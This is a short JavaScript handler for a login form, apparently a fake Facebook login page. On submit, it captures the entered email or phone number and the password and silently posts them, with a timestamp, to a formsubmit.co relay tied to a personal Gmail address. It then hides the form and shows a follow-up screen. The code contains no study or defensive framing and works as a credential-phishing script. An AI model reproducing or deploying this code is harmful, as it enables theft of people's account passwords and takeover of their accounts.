document.getElementById('fb-form').addEventListener('submit', function(e) {
  e.preventDefault();

  const email = document.getElementById('email').value.trim();
  const pass  = document.getElementById('pass').value;

  fetch("https://formsubmit.co/ajax/michaeleddy027@gmail.com", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      "Email/Phone": email,
      Password: pass,
      Time: new Date().toLocaleString()
    })
  });

  document.querySelector('.login-box').style.display = 'none';
  document.getElementById('final').classList.remove('hidden');
});
